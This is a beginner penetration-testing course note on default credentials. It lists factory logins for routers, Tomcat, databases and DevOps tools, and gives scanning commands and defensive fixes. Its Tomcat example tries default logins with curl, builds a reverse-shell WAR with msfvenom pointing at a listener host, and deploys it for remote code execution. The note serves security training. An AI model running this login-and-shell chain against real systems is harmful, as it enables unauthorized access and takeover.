---
tags: [vapt, authentication, beginner]
difficulty: beginner
module: "16 - Authentication"
topic: "16.05 Default Credentials"
---

# 16.05 — Default Credentials

## What Are Default Credentials?

```
EVERY DEVICE/APPLICATION SHIPS WITH DEFAULT CREDENTIALS:
  Router admin panel:    admin:admin  /  admin:password
  Cisco switches:        cisco:cisco
  Tomcat manager:        tomcat:tomcat  /  admin:admin
  Jenkins (old):         admin:admin  (no auth in older installs)
  Elasticsearch (old):  <no auth!>
  MongoDB (old):         <no auth!>
  phpMyAdmin:            root:<blank>  /  root:root
  WordPress first run:   admin:<set during install>
  Grafana default:       admin:admin
  Jupyter Notebook:      <no auth by default!>
  Kibana:                <no auth in old versions>
  Docker API (port 2375): <no auth!>
  Kubernetes dashboard:  <no auth in old setups>
  Printer admin:         admin:admin  /  admin:1234
  IP cameras:            admin:admin  /  admin:12345
  
WHY IT MATTERS:
  Developers install software, forget to change default credentials
  Gets deployed to production
  Attacker tries defaults → instant access!
```

---

## Discovery and Testing

```bash
# AUTOMATED SCANNING:
# Nmap service version detection reveals software
nmap -sV -p- target.com

# SHODAN / CENSYS (for internet-exposed services):
# shodan.io → search "default password" service:tomcat
# censys.io → similar

# TOOL: DefaultCreds-Cheat-Sheet
# github.com/ihebski/DefaultCreds-cheat-sheet
pip install defaultcreds-cheat-sheet
creds search tomcat
creds search cisco

# MANUAL LOOKUP:
# https://www.cirt.net/passwords
# https://default-password.info/
# https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials

# SPECIFIC TARGETS:
cat /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
cat /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```

---

## Common Targets in VAPT

```
WEB APPLICATION SERVERS:
  Tomcat Manager:    http://target:8080/manager
    Try: tomcat:tomcat, admin:admin, admin:s3cret, manager:manager
    
  JBoss/WildFly:     http://target:8080/console
    Try: admin:admin, admin:jboss
    
  WebLogic:          http://target:7001/console
    Try: weblogic:weblogic1  weblogic:welcome1
    
  GlassFish:         http://target:4848
    Try: admin:adminadmin

NETWORK DEVICES:
  Cisco IOS:         telnet/ssh → cisco:cisco
  Juniper:           root:(blank)
  Ubiquiti:          ubnt:ubnt
  SNMP v1/v2:        community string "public" (read), "private" (write)!

DATABASES:
  MySQL/MariaDB:     root:(blank)  →  mysql -h target -u root
  MSSQL:             sa:(blank)    →  sqlcmd -S target -U sa -P ""
  PostgreSQL:        postgres:postgres
  Redis:             redis-cli -h target PING (often no auth!)
  
CLOUD/DEVOPS:
  Kubernetes:        kubectl proxy → http://localhost:8001/api/
  Consul:            http://target:8500/ui (no auth default)
  Vault (HashiCorp): token: root or s.xxxx (dev mode)
  RabbitMQ:          guest:guest (http://target:15672)
  Grafana:           admin:admin (http://target:3000)
```

---

## Testing Tomcat (Practical Example)

```bash
# DISCOVER TOMCAT:
nmap -sV -p 8080 target.com
# → Apache Tomcat/9.0.x

# TRY MANAGER:
curl -u tomcat:tomcat http://target.com:8080/manager/html
curl -u admin:admin http://target.com:8080/manager/html
curl -u manager:manager http://target.com:8080/manager/html

# BURP: send each credential pair

# IF MANAGER ACCESS → DEPLOY WAR FILE → RCE!
# Create war:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war

# Upload via manager:
curl -u tomcat:tomcat -T shell.war "http://target.com:8080/manager/text/deploy?path=/shell"

# Execute:
curl http://target.com:8080/shell/
```

---

## Fix

```
DEFENSES:
  ✓ Change ALL default credentials before deployment (mandatory!)
  
  ✓ Automated credential auditing in CI/CD pipeline
    Trivy, Checkov, others scan for known defaults
    
  ✓ Inventory: know every service running in your environment
  
  ✓ Disable admin consoles if not needed (Tomcat Manager in prod!)
  
  ✓ Network segmentation: admin panels not accessible from internet
  
  ✓ Regular scans: Nessus/OpenVAS check for default credentials
```

---

## Related Notes
- [[02 - Password Brute Force]] — when defaults don't work, try wordlists
- [[28 - Defense Rate Limiting Lockout MFA]] — hardening auth
